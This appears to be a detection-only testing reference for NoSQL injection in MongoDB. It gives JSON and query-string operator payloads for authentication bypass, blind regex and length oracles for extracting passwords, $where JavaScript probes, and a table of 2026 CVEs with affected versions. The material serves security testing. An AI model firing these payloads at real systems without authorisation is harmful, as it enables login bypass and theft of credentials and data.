# NoSQL injection (MongoDB and friends)

Usually JSON body params or query params that a server passes to a Mongo query. Classic
signals: error strings like `MongoError`, `$where`, `Cannot use 'undefined'`, or operator
syntax being evaluated instead of treated as a string.

> **Detection-only.** Read-only oracles (boolean/length/error class); time probes capped at 7s, no
> writes, no `$where` sleep campaigns.

## Operator injection (MongoDB)

Send JSON where the value is an object, not a string:

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "MARKER.*"}, "password": {"$ne": ""}}
{"username": {"$in": ["admin"]}, "password": {"$ne": ""}}
```

If any of these logs you in / returns data without a valid password → auth bypass.

## Data exfiltration (blind, regex + timing)

```
{"username":"admin","password":{"$regex":"^a"}}            -> boolean (response differs)
{"username":"admin","password":{"$regex":"^.{1}$"}}        -> length oracle
{"username":"admin","password":{"$regex":"^MARKER"}}       -> prefix oracle
```

## `$where` / JS evaluation (MongoDB)

```
{"$where": "sleep(5000)"}                                  -> time-based
{"$where": "this.password == 'MARKER'"}
{"$where": "1"}                                            -> always-true (return all)
```

## Query-string forms

`?username[$ne]=x&password[$ne]=y`  (PHP/Express body parsers expand `a[b]` into objects)

## Notes

- Confirm with `--show-body` (quote the returned doc as PoC) and `--diff` for same-length
  boolean responses.
- Never run a destructive `$where`/`db.drop()` — read-only oracles only.

## 2026: NoSQL and graph-query disclosures

The 2026 shape is **operator injection through a field that is supposed to be a string** — a reset
token, a thread id, a filter object. The probe is the same as above, one level narrower: send an
object (or a `$`-prefixed key) where the code expects an opaque string, then compare the error
class and the response length against a valid string.

| Field shape | CVE / advisory | Date | Affected | Check |
|---|---|---|---|---|
| Reset/verification token as object | CVE-2026-30941 / GHSA-vgjh-hmwf-c588 | 2026-03 | Parse Server 9.0.0–<9.5.2-alpha.1, <8.6.14 | object instead of string on both token endpoints; must be rejected |
| User-controlled Mongo filter (Find And Replace) | CVE-2026-54313 / GHSA-jpq7-226w-6cxx | 2026-06 | n8n <2.24.0 | authenticated workflow-editor only; unexpected cross-document write |
| Checkpoint identifiers as operators | CVE-2026-48121 / GHSA-98xf-r82g-9mhx | 2026-05 | `@langchain/langgraph-checkpoint-mongodb` ≤1.3.0 | `thread_id` / `checkpoint_ns` / `checkpoint_id` must be strings |
| Store/checkpoint filter operators | CVE-2026-55253 / GHSA-533j-2v4q-mw5h | 2026-06 | `langgraph-checkpoint-mongodb` <0.3.0, `langgraph-store-mongodb` <0.4.0 | `$`-prefixed keys in `list`/`search` filters |
| Cypher/graph query injection | CVE-2026-41274 / GHSA-28g4-38q8-3cwc | 2026-04 | Flowise and `flowise-components` ≤3.0.13 (fix 3.1.0) | GraphCypherQAChain chatflow; input reaches Cypher without validation |

Record as `nosqli` (CWE-943) or, for the Cypher row, `injection` (CWE-943 is still the closest;
say "Cypher" in the title). An operator that only changes the error message is `suspected`; an
operator that returns another tenant's document is `exploited`.
